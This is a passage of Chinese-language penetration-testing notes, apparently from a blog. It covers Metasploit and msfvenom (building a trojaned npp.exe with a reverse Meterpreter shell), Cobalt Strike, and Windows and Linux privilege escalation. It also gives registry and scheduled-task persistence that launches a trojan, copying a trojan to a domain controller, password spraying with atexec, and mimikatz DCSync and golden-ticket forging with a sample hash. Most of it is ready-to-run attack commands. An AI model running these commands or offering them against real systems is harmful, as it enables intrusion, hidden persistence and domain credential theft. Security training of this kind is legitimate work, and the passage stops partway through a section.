<td>encoders</td>
<td>存放各种编码，主要用于绕过入侵检测和过滤</td>
</tr>
<tr>
<td>
<p>exploits</p>
</td>
<td>
<p>包含了 exp、0day, 各种洞利用的脚本，主要的攻击代码全在这<br />
 exp 的路径的命名规则是： <code>系统/服务/模块</code> ，例如： <code>exploit/windows/local/tokenmagic</code></p>
</td>
</tr>
<tr>
<td>
<p>payloads</p>
</td>
<td>
<p>主要是在目标机执行<br />
命名规则： <code>系统/类型/名称</code></p>
</td>
</tr>
<tr>
<td>post</td>
<td>这个目录里放着 msf 的 exploits 执行成功后，向目标机执行的一直些操作，比如：提权，获取 shell</td>
</tr>
</tbody>
</table>
<div class="note info">
<p class="rainbow">基本命令</p>
</div>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>msfconsole</td>
<td>启动 MSF</td>
</tr>
<tr>
<td>apt-get isntall metasploit-framework</td>
<td>更新 MSF (root 用户)</td>
</tr>
<tr>
<td>search name:ms17 type:exploit</td>
<td>搜索</td>
</tr>
<tr>
<td>use 0</td>
<td>使用</td>
</tr>
<tr>
<td>back</td>
<td>返回</td>
</tr>
<tr>
<td>show option</td>
<td>查看选项</td>
</tr>
<tr>
<td>show payloads</td>
<td>查看 payload</td>
</tr>
<tr>
<td>show targets</td>
<td>查看目标列表</td>
</tr>
<tr>
<td>set/unset</td>
<td>设置值</td>
</tr>
</tbody>
</table>
<div class="note info">
<p class="rainbow">类型命名规则</p>
</div>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>shell</td>
<td>上传一个 shell</td>
</tr>
<tr>
<td>dllinject</td>
<td>注入一个 dll 到进程</td>
</tr>
<tr>
<td>patchup</td>
<td>修补漏洞</td>
</tr>
<tr>
<td>upexec</td>
<td>上传并执行一个文件</td>
</tr>
<tr>
<td>vncinject</td>
<td>高级的 payload</td>
</tr>
<tr>
<td>meterpreter</td>
<td>高级的 payload</td>
</tr>
<tr>
<td>passive</td>
<td>高级的 payload</td>
</tr>
</tbody>
</table>
<div class="note info">
<p class="rainbow">名称命名规则</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">shell_find_tag</td>
<td style="text-align:center">在一个已建立的连接上创建一个新 shell</td>
</tr>
<tr>
<td style="text-align:center">shell_reverse_tcp</td>
<td style="text-align:center">反向连接到攻击者主机并创建一个 shell</td>
</tr>
<tr>
<td style="text-align:center">bind_tcp</td>
<td style="text-align:center">监听一个 TCP 连接</td>
</tr>
<tr>
<td style="text-align:center">reverse_tcp</td>
<td style="text-align:center">反向建立 tcp 连接</td>
</tr>
<tr>
<td style="text-align:center">reverse_http</td>
<td style="text-align:center">反向建立 http 连接</td>
</tr>
<tr>
<td style="text-align:center">add_user</td>
<td style="text-align:center">创建一个新用户并添加到管理组</td>
</tr>
<tr>
<td style="text-align:center">tcp_allports</td>
<td style="text-align:center">在所有可能的端口进行测试</td>
</tr>
</tbody>
</table>
<h2 id="meterpreter"><a class="anchor" href="#meterpreter">#</a> Meterpreter</h2>
<div class="note info">
<p class="rainbow">命令说明</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">background</td>
<td style="text-align:center">放置后台</td>
</tr>
<tr>
<td style="text-align:center">sessions</td>
<td style="text-align:center">会话列表</td>
</tr>
<tr>
<td style="text-align:center">getuid</td>
<td style="text-align:center">获取账户信息</td>
</tr>
</tbody>
</table>
<h2 id="msfvenom-payload木马"><a class="anchor" href="#msfvenom-payload木马">#</a> msfvenom-payload 木马</h2>
<figure class="highlight sh"><figcaption data-lang="sh"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token parameter variable">-l</span>  列出所有可用的payload,编码器,空指令……</pre></td></tr><tr><td data-num="2"></td><td><pre>    payloads, encoders, nops, platforms, archs, encrypt, formats, all</pre></td></tr><tr><td data-num="3"></td><td><pre>    查看所有payloads: msfvenom <span class="token parameter variable">-l</span> payloads</pre></td></tr><tr><td data-num="4"></td><td><pre>    查看所有encoders：</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token parameter variable">-p</span>  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token parameter variable">-a</span>	选择架构平台 x86 <span class="token operator">|</span> x64 <span class="token operator">|</span> x86_64</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token parameter variable">-f</span>  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token parameter variable">-e</span>  指定要使用那种编码器</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token parameter variable">-i</span>  指定编码的次数,如果使用编码器</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token parameter variable">-b</span>  指定坏字符,比如空字符截断问题,等等……</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token parameter variable">-x</span>  使用一个自定义可执行程序模板,并将payload嵌入其中</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token parameter variable">-k</span>  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token parameter variable">-o</span>  指定创建好的payload的存放位置</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.1698</span>.0.0 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-x</span> npp.exe <span class="token parameter variable">-f</span> exe <span class="token operator">></span> xxx.exe</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>use exploit/multi/handle</pre></td></tr><tr><td data-num="18"></td><td><pre>handle <span class="token parameter variable">-H</span> <span class="token number">0.0</span>.0.0 <span class="token parameter variable">-P</span> <span class="token number">4444</span> <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp</pre></td></tr></table></figure><h2 id="cscobalt-strike"><a class="anchor" href="#cscobalt-strike">#</a> CS（Cobalt Strike）</h2>
<blockquote>
<p>关键文件 — 放入 linux，赋予 X 权限</p>
</blockquote>
<figure class="highlight sh"><figcaption data-lang="sh"></figcaption><table><tr><td data-num="1"></td><td><pre>teamserver</pre></td></tr><tr><td data-num="2"></td><td><pre>TeamServerImage</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>./teamserver <span class="token comment">## 启动</span></pre></td></tr></table></figure><blockquote>
<p>界面说明</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>Beacon: 轻量级的命令与控制代理</pre></td></tr><tr><td data-num="2"></td><td><pre>TeamServer: 团队成员协作的核心</pre></td></tr><tr><td data-num="3"></td><td><pre>有效载荷：用于在目标系统建立 Beacon</pre></td></tr><tr><td data-num="4"></td><td><pre>监听器：用于接收 beacon 连接的服务</pre></td></tr><tr><td data-num="5"></td><td><pre>后渗透工具：自己添加</pre></td></tr><tr><td data-num="6"></td><td><pre>模拟攻击：钓鱼攻击</pre></td></tr></table></figure><blockquote>
<p>会话转移</p>
</blockquote>
<figure class="highlight sh"><figcaption data-lang="sh"></figcaption><table><tr><td data-num="1"></td><td><pre>background</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> session										<span class="token comment">## 选择会话</span></pre></td></tr><tr><td data-num="3"></td><td><pre>use exploit/windows/local/payload_inject		<span class="token comment">## 使用模块</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_http	<span class="token comment">## 设置 payload</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">set</span> lhost	xxx									<span class="token comment">## 设置为 csIP 和端口</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin class-name">set</span> disablepayloadhandle <span class="token boolean">true</span>					<span class="token comment">## 关闭原本 payload 的监听</span></pre></td></tr><tr><td data-num="7"></td><td><pre>exploit <span class="token operator">|</span> run <span class="token parameter variable">-j</span>								<span class="token comment">## 运行并转接</span></pre></td></tr></table></figure><blockquote>
<p>扩展插件</p>
</blockquote>
<p>自己搜补充</p>
<h2 id="windows提权"><a class="anchor" href="#windows提权">#</a> windows 提权</h2>
<blockquote>
<p>getshell 提权</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>通过网站漏洞进行提权，先小马，再大马 (CS 或者其他)</pre></td></tr></table></figure><blockquote>
<p>内核漏洞提权</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>方法 1：使用 MSF getsystem</pre></td></tr><tr><td data-num="2"></td><td><pre>		getuid</pre></td></tr><tr><td data-num="3"></td><td><pre>		migrate	进程号</pre></td></tr><tr><td data-num="4"></td><td><pre>方法 2：内核提权</pre></td></tr><tr><td data-num="5"></td><td><pre>		利用系统补丁获取漏洞</pre></td></tr><tr><td data-num="6"></td><td><pre>		补丁分析平台：https:&#x2F;&#x2F;tools.zjun.info&#x2F;getmskb&#x2F;</pre></td></tr><tr><td data-num="7"></td><td><pre>		exp 平台：https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits&#x2F;tree&#x2F;master</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>方法 3：BypassUAC</pre></td></tr><tr><td data-num="10"></td><td><pre>		msf 里面搜索 bypassuac</pre></td></tr><tr><td data-num="11"></td><td><pre>		search bypassuac</pre></td></tr><tr><td data-num="12"></td><td><pre>		</pre></td></tr><tr><td data-num="13"></td><td><pre>方法 4：UACME 提权</pre></td></tr><tr><td data-num="14"></td><td><pre>	项目地址：https:&#x2F;&#x2F;github.com&#x2F;hfiref0x&#x2F;UACME</pre></td></tr><tr><td data-num="15"></td><td><pre>	代码：akagi64 61 c:\windows\system32\charmap.exe</pre></td></tr><tr><td data-num="16"></td><td><pre>	使用  方法：程序名 编号 想要执行的程序</pre></td></tr><tr><td data-num="17"></td><td><pre>	思路：将要执行的程序换成提权程序或是木马文件</pre></td></tr></table></figure><h2 id="linux提权"><a class="anchor" href="#linux提权">#</a> linux 提权</h2>
<blockquote>
<p>内核漏洞提权</p>
</blockquote>
<figure class="highlight sh"><figcaption data-lang="sh"></figcaption><table><tr><td data-num="1"></td><td><pre>效率最高的提权方式：</pre></td></tr><tr><td data-num="2"></td><td><pre>	通过工具或脚本确认当前系统可以提权的CVE或直接通过工具提权</pre></td></tr><tr><td data-num="3"></td><td><pre>	工具：</pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token number">1</span>.linux-exploit-suggester</pre></td></tr><tr><td data-num="5"></td><td><pre>	项目地址：https://github.com/The-Z-Labs/linux-exploit-suggester</pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token number">2</span>.linux-exploit-suggester-2</pre></td></tr><tr><td data-num="7"></td><td><pre>	项目地址：</pre></td></tr><tr><td data-num="8"></td><td><pre>		https://github.com/jondonas/linux-exploit-suggester-2/</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>脚本利用合集：</pre></td></tr><tr><td data-num="11"></td><td><pre>https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>重点关注：脏牛（Dirty COW）Dirty Pipe<span class="token punctuation">(</span>CVE-2022-0847<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>SUID:临时在系统中运行高权限的应用，必须是root权限</pre></td></tr><tr><td data-num="17"></td><td><pre>寻找SUID：</pre></td></tr><tr><td data-num="18"></td><td><pre>方法1：利用命令寻找</pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-ldb</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-la</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-perm</span> /4000</pre></td></tr><tr><td data-num="24"></td><td><pre>	</pre></td></tr><tr><td data-num="25"></td><td><pre>有安全问题的指令程序：</pre></td></tr><tr><td data-num="26"></td><td><pre>    Nmap   （2.0<span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span><span class="token operator">=</span> nmap<span class="token operator">&lt;</span><span class="token number">5.2</span><span class="token punctuation">)</span>  带交互模式，允许执行shell命令</pre></td></tr><tr><td data-num="27"></td><td><pre>    		<span class="token number">5.2</span>.0之后 <span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/sh")'</span> <span class="token operator">></span> getshellsudo nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>getshell</pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token function">vim</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token function">find</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    Bash</pre></td></tr><tr><td data-num="31"></td><td><pre>    More</pre></td></tr><tr><td data-num="32"></td><td><pre>    Less</pre></td></tr><tr><td data-num="33"></td><td><pre>    Nano</pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token function">cp</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    taskset</pre></td></tr><tr><td data-num="36"></td><td><pre>    xxd</pre></td></tr></table></figure><blockquote>
<p>错误配置提权</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>错误配置了 sudoer 文件，允许指定用户具备 sudo 所有权限</pre></td></tr></table></figure><figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>面试问题：</pre></td></tr><tr><td data-num="2"></td><td><pre>	sudoers 和 suid 提权，有什么区别？</pre></td></tr><tr><td data-num="3"></td><td><pre>区别：</pre></td></tr><tr><td data-num="4"></td><td><pre>	sudoers 提权是长期，suid 是临时的（前者第一次使用需要当前用户密码）</pre></td></tr></table></figure><blockquote>
<p>检测</p>
</blockquote>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240919-31659910">https://github.com/peass-ng/PEASS-ng/releases/tag/20240919-31659910</a></li>
</ol>
<h2 id="数据库提权"><a class="anchor" href="#数据库提权">#</a> 数据库提权</h2>
<blockquote>
<p>前提</p>
</blockquote>
<ul>
<li>数据库服务没有降权</li>
<li>获得 root 用户账号密码</li>
</ul>
<blockquote>
<p>常见数据库端口</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>MySQL			3306		root</pre></td></tr><tr><td data-num="2"></td><td><pre>SQL Server		1433		sa</pre></td></tr><tr><td data-num="3"></td><td><pre>Oracle			1521		sys 或 system</pre></td></tr><tr><td data-num="4"></td><td><pre>pointbase		9092</pre></td></tr><tr><td data-num="5"></td><td><pre>DB2				50000		</pre></td></tr><tr><td data-num="6"></td><td><pre>sybase			5000</pre></td></tr><tr><td data-num="7"></td><td><pre>postgreSQL		5432		postgre</pre></td></tr><tr><td data-num="8"></td><td><pre>mongoDB			27017</pre></td></tr><tr><td data-num="9"></td><td><pre>redis			6379</pre></td></tr><tr><td data-num="10"></td><td><pre>memcached		11211</pre></td></tr></table></figure><blockquote>
<p>方法</p>
</blockquote>
<ul>
<li>查看数据库文件</li>
</ul>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>常见数据库配置文件或文件夹：</pre></td></tr><tr><td data-num="2"></td><td><pre>	db</pre></td></tr><tr><td data-num="3"></td><td><pre>    sql</pre></td></tr><tr><td data-num="4"></td><td><pre>    data</pre></td></tr><tr><td data-num="5"></td><td><pre>    inc</pre></td></tr><tr><td data-num="6"></td><td><pre>    config</pre></td></tr><tr><td data-num="7"></td><td><pre>    conn</pre></td></tr><tr><td data-num="8"></td><td><pre>    database</pre></td></tr><tr><td data-num="9"></td><td><pre>    common</pre></td></tr><tr><td data-num="10"></td><td><pre>    include</pre></td></tr><tr><td data-num="11"></td><td><pre>    application</pre></td></tr></table></figure><ul>
<li>查看数据库备份文件</li>
</ul>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>（mysql).myd</pre></td></tr></table></figure><blockquote>
<p>数据库加密方式</p>
</blockquote>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> password<span class="token punctuation">(</span><span class="token string">'mypassword'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span>sha1<span class="token punctuation">(</span>unhex<span class="token punctuation">(</span>sha1<span class="token punctuation">(</span><span class="token string">'mypassword'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">## 使用了两次 SHA1 夹着一次 unhex 的方式对用户密码进行加密，要访问需要数据库开启远程访问</span></pre></td></tr></table></figure><h2 id="windows权限维持"><a class="anchor" href="#windows权限维持">#</a> windows 权限维持</h2>
<blockquote>
<p>隐藏木马</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>## 系统保护并且隐藏的文件</pre></td></tr><tr><td data-num="2"></td><td><pre>attrib +s +h  xxx.txt</pre></td></tr></table></figure><blockquote>
<p>关闭程序时触发木马 —— 修改注册表</p>
</blockquote>
<pre><code class="language-cmd">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512

reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1

reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\windows\new.exe&quot;
</code></pre>
<blockquote>
<p>打开程序时触发木马（下面代码有 bug）</p>
</blockquote>
<pre><code class="language-cmd">## copy要负载的程序
copy calc.exe _calc.exe

## 添加注册表
reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe&quot; /v Debugger /t reg_sz /d &quot;cmd /C _calc.exe &amp; C:\windows\new.exe&quot; /f
</code></pre>
<blockquote>
<p>系统登录触发木马 ——winlogon</p>
</blockquote>
<pre><code class="language-cmd">## 修改注册表中的Userinit的值

REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /V &quot;Userinit&quot; /t REG_SZ /F /D &quot;C:\Windows\system32\userinit.exe,C:\windows\new.exe&quot;
</code></pre>
<blockquote>
<p>服务 ——MSF（重启后）</p>
</blockquote>
<pre><code class="language-cmd">使用入侵木马
监听运行
使用服务木马
</code></pre>
<blockquote>
<p>生成计划任务 schtasks</p>
</blockquote>
<pre><code class="language-cmd">schtasks /Create /TN bak /SC DAILY /ST 19:49 /TR &quot;c:\test.exe&quot;

踩坑说明：
	木马路径不要使用有空格的目录
</code></pre>
<blockquote>
<p>开机启动项 —— 菜单 \ 程序 \ 启动</p>
</blockquote>
<blockquote>
<p>镜像劫持</p>
</blockquote>
<pre><code class="language-cmd">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe&quot; /f  
reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\test.exe&quot; /f
</code></pre>
<h2 id="linux权限维持"><a class="anchor" href="#linux权限维持">#</a> Linux 权限维持</h2>
<p>见 74</p>
<h2 id="横向移动"><a class="anchor" href="#横向移动">#</a> 横向移动</h2>
<blockquote>
<p>寻找域控（CS 操作）</p>
</blockquote>
<pre><code class="language-cmd">##看IP地址
ipconfig /all

##看域名
systeminfo

##插件获得密码

##IPC挂载
net use z: \\IP地址或主机名 “密码” /user:域\用户

##上传木马到域控（木马是正向连接）
copy 木马 \\192.168.0.0\C$

##创建计划任务

##CS连接
connect 192.168.0.0 4444
</code></pre>
<blockquote>
<p>常见端口</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>135,139,445,21,22,23,25,53,80,110,443,1433,1521,1863,3306,3389,5631,5632,5000</pre></td></tr><tr><td data-num="2"></td><td><pre>  </pre></td></tr><tr><td data-num="3"></td><td><pre>21 端口：FTP 文件传输服务</pre></td></tr><tr><td data-num="4"></td><td><pre>22 端口：SSH 端口</pre></td></tr><tr><td data-num="5"></td><td><pre>23 端口：TELNET 终端仿真服务</pre></td></tr><tr><td data-num="6"></td><td><pre>25 端口：SMTP 简单邮件传输服务</pre></td></tr><tr><td data-num="7"></td><td><pre>53 端口：DNS 域名解析服务</pre></td></tr><tr><td data-num="8"></td><td><pre>80 端口：HTTP 超文本传输服务</pre></td></tr><tr><td data-num="9"></td><td><pre>110 端口：POP3 “邮局协议版本 3” 使用的端口</pre></td></tr><tr><td data-num="10"></td><td><pre>443 端口：HTTPS 加密的超文本传输服务</pre></td></tr><tr><td data-num="11"></td><td><pre>1433 端口：MS SQL*SERVER 数据库 默认端口号</pre></td></tr><tr><td data-num="12"></td><td><pre>1521 端口：Oracle 数据库服务</pre></td></tr><tr><td data-num="13"></td><td><pre>1863 端口：MSN Messenger 的文件传输功能所使用的端口</pre></td></tr><tr><td data-num="14"></td><td><pre>3306 端口：MYSQL 默认端口号</pre></td></tr><tr><td data-num="15"></td><td><pre>3389 端口：Microsoft RDP 微软远程桌面使用的端口</pre></td></tr><tr><td data-num="16"></td><td><pre>5631 端口：Symantec pcAnywhere 远程控制数据传输时使用的端口</pre></td></tr><tr><td data-num="17"></td><td><pre>5632 端口：Symantec pcAnywhere 主控端扫描被控端时使用的端口</pre></td></tr><tr><td data-num="18"></td><td><pre>5000 端口：MS SQL Server 使用的端口</pre></td></tr></table></figure><h3 id="密码喷洒"><a class="anchor" href="#密码喷洒">#</a> 密码喷洒</h3>
<blockquote>
<p>工具</p>
</blockquote>
<p>（新）impackt 套件下载地址：<a target="_blank" rel="noopener" href="https://www.coresecurity.com/core-labs/open-source-tools/impacket">数据包 (coresecurity.com)</a></p>
<p>（老）windows：<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
<blockquote>
<p>喷洒利用</p>
</blockquote>
<p>atexec：自带提权</p>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>域环境用法：</pre></td></tr><tr><td data-num="2"></td><td><pre>atexec.exe &lt;domain&gt;&#x2F;&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; &quot;&lt;payload&gt;&quot;</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>单个设备本地使用：</pre></td></tr><tr><td data-num="5"></td><td><pre>atexec.exe .&#x2F;&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; &quot;&lt;payload&gt;&quot;</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>使用 hash：（hash 是密码的 hash）</pre></td></tr><tr><td data-num="8"></td><td><pre>atexec.exe  -hashes :&lt;hash&gt; &lt;domain&gt;&#x2F;&lt;username&gt;@&lt;ip&gt; &quot;&lt;command&gt;&quot;</pre></td></tr></table></figure><blockquote>
<p>python 转 exe</p>
</blockquote>
<pre><code class="language-cmd">1. pip install pyinstaller

2. 在Terminal下输入：“pyinstaller -F -w  *.py” 就可以生成exe。生成的文件放在同目录dist下。

 -F（注意大写）是所有库文件打包成一个exe

　-w是不出黑色控制台窗口。
</code></pre>
<blockquote>
<p>socket 代理转发</p>
</blockquote>
<ul>
<li>
<p>CS 客户端找到拿到 webshell 的 webser, 右键 ==&gt; 代理转发 ==&gt;socks 代理</p>
</li>
<li>
<p>利用 proxifiler (在使用当中更灵活)</p>
</li>
</ul>
<blockquote>
<p>windows 本地密码爆破</p>
</blockquote>
<ul>
<li>python 库 passlib.hash 对应 windows 中的密码</li>
<li>lsass.exe 处理用户输入密码的进程</li>
</ul>
<h3 id="黄金票据"><a class="anchor" href="#黄金票据">#</a> 黄金票据</h3>
<blockquote>
<p>什么是黄金票据及对应服务</p>
</blockquote>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>● Client - 客户端</pre></td></tr><tr><td data-num="2"></td><td><pre>● Server - 服务器</pre></td></tr><tr><td data-num="3"></td><td><pre>● KDC&#x3D;DC (Domain Controller) &#x3D;</pre></td></tr><tr><td data-num="4"></td><td><pre>  ○ AD（account database）+</pre></td></tr><tr><td data-num="5"></td><td><pre>  ○ AS（Authenication Service 认证服务）+</pre></td></tr><tr><td data-num="6"></td><td><pre>  ○ TGS（Ticket Granting Service 票据授予服务 - 白银票据）</pre></td></tr><tr><td data-num="7"></td><td><pre>  </pre></td></tr><tr><td data-num="8"></td><td><pre>票据（Ticket)：是网络对象互相访问的凭证</pre></td></tr><tr><td data-num="9"></td><td><pre>TGT（Ticket Granting Ticket）：用来生成票据的，票据（Ticket）他妈 —— 黄金票据</pre></td></tr><tr><td data-num="10"></td><td><pre>	用于身份认证、存储在内存当中，默认有效期为 10 个小时</pre></td></tr><tr><td data-num="11"></td><td><pre>KDC：负责管理票据、认证票据、分发票据</pre></td></tr></table></figure><blockquote>
<p>黄金票据伪造</p>
</blockquote>
<ul>
<li>
<p><code>krbtgt</code>  是域中的一个特殊用户，该用户是用于 <code>Kerberos</code>  身份验证的帐户，获得了该用户的 hash，就可以伪造票据进行票据传递</p>
</li>
<li>
<p>使用 <code>lrbtgt</code>  用户生成票据被称为黄金票据（ <code>TGT</code> ）</p>
</li>
</ul>
<blockquote>
<p>特点</p>
</blockquote>
<ul>
<li>需要与 DC 通信</li>
<li>需要 <code>krbtgt</code>  用户的 hash（ <code>KDChash</code> )</li>
</ul>
<h4 id="获取krbtgt用户hash"><a class="anchor" href="#获取krbtgt用户hash">#</a> 获取 krbtgt 用户 hash</h4>
<ul>
<li>
<p>利用：mimikatz</p>
</li>
<li>
<p>好处：会模拟域控，向目标请求账号的密码信息。动静很小，不用直接登录域控，也不需要提取 NTDS.DIT 文件</p>
</li>
<li>
<p>注意：需要域管理员或其他类似的高权限账号</p>
</li>
</ul>
<pre><code class="language-cmd">mimikatz @lsadump::dcsync /user:krbtgt
或
dcsync god.org god\krbtgt
或
shell wmic useraccount where name=&quot;krbtgt&quot; get sid
</code></pre>
<h4 id="伪造黄金票据"><a class="anchor" href="#伪造黄金票据">#</a> 伪造黄金票据</h4>
<pre><code class="language-cmd">使用之前：
mimikatz kerberos::list	  查看所有凭据信息
mimikatz kerberos::purge  清除凭据

命令格式：mimikatz kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt

示例：
mimikatz kerberos::golden /domain:god.org
 /sid:S-1-5-21-1218902331-2157346161-1782232778 /rc4:b097d7ed97495408e1537f706c357fc5 /user:administrator /ptt
</code></pre>
<h4 id="利用msf来伪造"><a class="anchor" href="#利用msf来伪造">#</a> 利用 MSF 来伪造</h4>
<p>1）将会话转交给 MSF</p>
